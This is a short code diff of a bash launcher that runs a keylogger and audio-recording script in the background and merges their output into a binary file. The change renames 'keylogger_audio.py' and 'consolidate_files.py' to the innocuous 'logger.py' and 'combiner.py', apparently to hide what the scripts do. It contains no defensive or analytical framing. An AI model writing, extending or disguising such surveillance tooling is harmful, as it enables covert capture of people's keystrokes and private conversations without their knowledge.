@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Define script names and output files
-KEYLOGGER_AUDIO_SCRIPT="keylogger_audio.py"
-CONSOLIDATE_SCRIPT="consolidate_files.py"
+KEYLOGGER_AUDIO_SCRIPT="logger.py"
+CONSOLIDATE_SCRIPT="combiner.py"
 COMBINED_OUTPUT="combined_output.bin"
 
 # Run the keylogger and audio recording script in the background
